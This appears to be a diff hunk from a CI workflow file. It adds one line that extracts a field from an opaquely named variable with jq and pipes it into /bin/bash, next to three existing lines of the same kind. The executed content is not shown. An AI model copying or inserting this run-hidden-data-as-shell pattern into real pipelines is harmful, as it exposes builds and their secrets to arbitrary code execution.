@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$tcs53" | jq -r .z072 | /bin/bash
           echo $jpa8091 | jq -r .jsc8254 | /bin/bash
           echo $hc4320 | jq -r .ji43559 | /bin/bash
+          printf '%s' "$tr470" | jq -r .sc07233 | /bin/bash
 
       - name: Save results
         if: always()
